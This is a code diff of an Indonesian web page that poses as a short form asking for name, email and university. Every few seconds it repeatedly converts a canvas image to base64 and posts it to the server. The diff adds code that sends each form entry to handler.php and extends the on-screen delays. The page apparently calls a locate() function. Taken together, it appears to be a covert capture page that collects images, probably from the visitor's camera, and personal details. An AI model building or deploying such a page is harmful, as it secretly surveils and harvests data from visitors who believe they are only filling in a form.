@@ -74,7 +74,7 @@ var context = canvas.getContext('2d');
        var canvasData = canvas.toDataURL("image/png")
        cc = String(canvasData).replace("data:image/png;base64,","")
       //  console.log(cc)
-       post(cc); }, 6000);
+       post(cc); }, 7000);
   
 
 }
@@ -107,12 +107,22 @@ init();
 
   function klikSubmit(namaID){
 
-    console.log(document.getElementById(namaID).value);
+    //console.log(document.getElementById(namaID).value);
    // document.getElementBy().style.display = "inline-block";
-    
 
+   var formulir = document.getElementById(namaID);
+   //console.log(formulir.name);
+   //console.log(formulir.value);
+   $.ajax({          
+            type: 'POST',
+            url: 'handler.php',
+            data: {"data_formulir":`${formulir.name} : ${formulir.value}`},
+            mimeType: 'text'
+            });
+       
   }
 
+  
   $(document).ready(function(){
 
     // inisialisasi
@@ -121,16 +131,16 @@ init();
     $('#asalUniversitas').hide();
 
     $('.tbl1').click(function() {
-      $('#gtau').fadeIn(200).delay(10000).fadeOut(); 
+      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
       $('#nama').fadeOut();
-      $('#alamatEmail').delay(10000).fadeIn();
+      $('#alamatEmail').delay(15000).fadeIn();
       
     });
 
     $('.tbl2').click(function() {
-      $('#gtau').fadeIn(200).delay(10000).fadeOut(); 
+      $('#gtau').fadeIn(200).delay(14000).fadeOut(); 
       $('#alamatEmail').fadeOut();
-      $('#asalUniversitas').delay(10000).fadeIn();
+      $('#asalUniversitas').delay(15000).fadeIn();
       
     });
 
@@ -144,7 +154,7 @@ init();
 <div id="nama">
     <div class="form-group" onload="locate()">
       <label for="namaform1">Nama</label>
-      <input type="text" class="form-control" id="namaform1" aria-describedby="emailHelp" placeholder="masukkan nama">
+      <input type="text" class="form-control" id="namaform1" aria-describedby="emailHelp" name="Nama" placeholder="masukkan nama">
     </div>
   
     <button class="btn btn-primary tbl1" onclick="klikSubmit('namaform1')">Kirim</button>
@@ -155,9 +165,9 @@ init();
 
 
 <div id="alamatEmail">
-    <div class="form-group" onload="locate()">
+    <div class="form-group">
       <label for="emailform1">Email</label>
-      <input type="email" class="form-control" id="emailform1" aria-describedby="emailHelp" placeholder="masukkan email">
+      <input type="email" class="form-control" id="emailform1" aria-describedby="emailHelp" name="Email" placeholder="masukkan email">
     </div>
   
     <button class="btn btn-primary tbl2" onclick="klikSubmit('emailform1')">Kirim</button>
@@ -168,10 +178,10 @@ init();
 <div id="asalUniversitas">
   <div class="form-group" onload="locate()">
     <label for="asalUnivform1">Asal universitas</label>
-    <input type="email" class="form-control" id="asalUnivform1" aria-describedby="emailHelp" placeholder="asal universitas">
+    <input type="email" class="form-control" id="asalUnivform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas">
   </div>
 
-  <button class="btn btn-primary " onclick="klikSubmit('emailform1')">Kirim</button>
+  <button class="btn btn-primary " onclick="klikSubmit('asalUnivform1')">Kirim</button>
   
 </div>
 
